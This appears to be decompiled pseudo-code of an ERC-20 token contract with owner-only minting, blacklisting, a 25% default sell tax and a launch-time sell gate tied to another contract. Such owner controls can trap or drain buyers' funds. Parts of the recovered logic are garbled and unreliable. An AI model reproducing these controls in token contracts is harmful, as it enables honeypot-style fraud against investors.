contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
const name = '', 0

const decimals = 18

const symbol = '', 0


uint8 stor0;
uint8 stor0; offset 8
uint16 stor0;
address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
address dexRouterAddress;
address liquidityPairAddress;
uint8 isTradingEnabled; offset 160
address sub_57cb6dd4Address;
uint256 buyTax;
uint256 sellTax;
mapping of uint8 stor109;
mapping of uint8 stor110;
address sub_784a6f83Address;

function isTradingEnabled() {
    return bool(isTradingEnabled)
}

function dexRouter() {
    return dexRouterAddress
}

function totalSupply() {
    return totalSupply
}

function buyTax() {
    return buyTax
}

function sub_57cb6dd4(?) {
    return sub_57cb6dd4Address
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function sub_784a6f83(?) {
    return sub_784a6f83Address
}

function liquidityPair() {
    return liquidityPairAddress
}

function owner() {
    return owner
}

function whitelist(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor110[arg1])
}

function sellTax() {
    return sellTax
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function blacklist(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor109[arg1])
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    owner = 0
    emit OwnershipTransferred(owner, 0);
}

function enableTrading() {
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if isTradingEnabled:
        revert with 0, 'Trading already enabled'
    isTradingEnabled = 1
}

function sub_5bb40ab6(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    sub_784a6f83Address = address(arg1)
}

function setBuyTax(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if arg1 > 25:
        revert with 0, 'Tax cant be higher than 25'
    buyTax = arg1
}

function setSellTax(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if arg1 > 25:
        revert with 0, 'Tax cant be higher than 25'
    sellTax = arg1
}

function setBlacklist(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    stor109[address(arg1)] = uint8(arg2)
}

function setWhitelist(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    stor110[address(arg1)] = uint8(arg2)
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    owner = arg1
    emit OwnershipTransferred(owner, arg1);
}

function mint(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if not msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply > !arg1:
        revert with 0, 17
    totalSupply += arg1
    if balanceOf[address(msg.sender)] > !arg1:
        revert with 0, 17
    balanceOf[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burn(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
    if balanceOf[address(msg.sender)] < arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
    balanceOf[address(msg.sender)] -= arg1
    if totalSupply < arg1:
        revert with 0, 17
    totalSupply -= arg1
    emit Transfer(arg1, msg.sender, 0);
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function withdrawToken(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 32, 32, 0xfe4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65
    require ext_code.size(arg1)
    staticcall arg1.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args owner, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function initialize(address arg1, address arg2, address arg3, uint256 arg4) {
    require calldata.size - 4 >= 128
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if uint8(stor0.field_8):
        if ext_code.size(this.address):
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Initializable: contract is already initialized'
    else:
        if uint8(stor0.field_0):
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Initializable: contract is already initialized'
    if not uint8(stor0.field_8):
        uint16(stor0.field_0) = 257
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Initializable: contract is not initializing'
    owner = msg.sender
    emit OwnershipTransferred(owner, msg.sender);
    buyTax = 0
    sellTax = 25
    sub_57cb6dd4Address = arg3
    isTradingEnabled = 0
    dexRouterAddress = arg1
    require ext_code.size(arg1)
    staticcall arg1.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).createPair(address arg1, address arg2) with:
         gas gas_remaining wei
        args this.address, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    liquidityPairAddress = ext_call.return_data[12 len 20]
    if not msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply > !arg4:
        revert with 0, 17
    totalSupply += arg4
    if balanceOf[address(msg.sender)] > !arg4:
        revert with 0, 17
    balanceOf[address(msg.sender)] += arg4
    emit Transfer(arg4, 0, msg.sender);
    if not uint8(stor0.field_8):
        uint8(stor0.field_8) = 0
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0, 'Sender is zero address'
    if not arg1:
        revert with 0, 'Recipient is zero address'
    if stor109[address(msg.sender)]:
        revert with 0, 'Address blacklisted'
    if stor109[address(arg1)]:
        revert with 0, 'Address blacklisted'
    if not stor110[address(msg.sender)]:
        if not isTradingEnabled:
            revert with 0, 'ANTI-BOT: Cannot trade yet!'
        if liquidityPairAddress == msg.sender:
            if balanceOf[msg.sender] > !arg2:
                revert with 0, 17
            if balanceOf[msg.sender] + arg2 > totalSupply / 100:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ANTI-BOT: Cannot have more than 1% of supply'
    else:
        if not stor110[address(arg1)]:
            if not isTradingEnabled:
                revert with 0, 'ANTI-BOT: Cannot trade yet!'
            if liquidityPairAddress == msg.sender:
                if balanceOf[msg.sender] > !arg2:
                    revert with 0, 17
                if balanceOf[msg.sender] + arg2 > totalSupply / 100:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ANTI-BOT: Cannot have more than 1% of supply'
    if isTradingEnabled:
        if liquidityPairAddress == arg1:
            require ext_code.size(sub_784a6f83Address)
            staticcall sub_784a6f83Address.0x70a08231 with:
                    gas gas_remaining wei
                   args msg.sender
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            if ext_call.return_data[0] <= 0:
                revert with 0, 'ANTI-BOT: User must have more than one node to sell on launch'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'Not enough tokens'
    if stor110[address(msg.sender)]:
        if arg2 and 0 > -1 / arg2:
            revert with 0, 17
        if arg2 < 0:
            revert with 0, 17
        if balanceOf[address(msg.sender)] < arg2:
            revert with 0, 17
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[arg1] > !arg2:
            revert with 0, 17
        balanceOf[arg1] += arg2
        if balanceOf[stor106] > -1:
            revert with 0, 17
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor110[address(arg1)]:
            if arg2 and 0 > -1 / arg2:
                revert with 0, 17
            if arg2 < 0:
                revert with 0, 17
            if balanceOf[address(msg.sender)] < arg2:
                revert with 0, 17
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[arg1] > !arg2:
                revert with 0, 17
            balanceOf[arg1] += arg2
            if balanceOf[stor106] > -1:
                revert with 0, 17
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if liquidityPairAddress == arg1:
                if arg2 and sellTax > -1 / arg2:
                    revert with 0, 17
                if arg2 < arg2 * sellTax / 100:
                    revert with 0, 17
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 0, 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[arg1] > !(arg2 - (arg2 * sellTax / 100)):
                    revert with 0, 17
                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * sellTax / 100)
                if balanceOf[stor106] > !sellTax:
                    revert with 0, 17
                balanceOf[stor106] += sellTax
                emit Transfer((arg2 - (arg2 * sellTax / 100)), msg.sender, arg1);
            else:
                if stor110[address(arg1)]:
                    if arg2 and 0 > -1 / arg2:
                        revert with 0, 17
                    if arg2 < 0:
                        revert with 0, 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[arg1] > !arg2:
                        revert with 0, 17
                    balanceOf[arg1] += arg2
                    if balanceOf[stor106] > -1:
                        revert with 0, 17
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if liquidityPairAddress != msg.sender:
                        if arg2 and 0 > -1 / arg2:
                            revert with 0, 17
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        if balanceOf[stor106] > -1:
                            revert with 0, 17
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2 and buyTax > -1 / arg2:
                            revert with 0, 17
                        if arg2 < arg2 * buyTax / 100:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !(arg2 - (arg2 * buyTax / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * buyTax / 100)
                        if balanceOf[stor106] > !buyTax:
                            revert with 0, 17
                        balanceOf[stor106] += buyTax
                        emit Transfer((arg2 - (arg2 * buyTax / 100)), msg.sender, arg1);
    return 1
}



}
